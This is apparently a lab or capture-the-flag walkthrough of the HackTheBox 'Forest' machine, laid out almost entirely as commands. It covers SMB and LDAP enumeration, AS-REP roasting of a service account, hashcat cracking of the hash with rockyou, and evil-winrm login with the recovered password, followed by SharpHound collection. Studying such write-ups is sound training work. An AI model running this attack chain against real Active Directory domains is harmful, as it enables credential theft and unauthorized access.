#### Enumeration
##### Nmap
```bash
rustscan -a $IP -- -A -T4 -oN nmap.log
```

##### SMB
- Anonymous logic successful but no shares found

```bash
smbclient -L //$IP/
```
- Account Lockout Threshold: None
```bash
crackmapexec smb $IP --pass-pol
```

##### LDAP
- Anonymous bind successful
```bash
windapsearch --dc-ip $IP -u "" --functionality
```
- Enumerate all users
```bash
windapsearch --dc-ip $IP -u "" -U | tee windasearch-users.log
```
- Enumerate all objects
```bash
windapsearch --dc-ip $IP -u "" --custom "ObjectClass=*" | tee windasearch-objects.log
```

- Found: _svc-alfresco_ service account
- Found: 5 domain users

##### Asreproasting
```bash
GetNPUsers.py -dc-ip $IP -usersfile domain-users.txt -request -format hashcat -outputfile asreprost.out HTB.local/
```
- Got _TGT_ for _svc-alfresco_ service account

```bash
hashcat -m 18200 -a 0 asreprost.hashes /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -O
```
- svc-alfresco:_s3rvice_

##### Evil-winrm
```bash
evil-winrm -i $IP -u svc-alfresco -p s3rvice
```

##### BloodHound/SharpHound
```powershell
.\SharpHound.exe -c all --zipfilename ad-data-kick
```




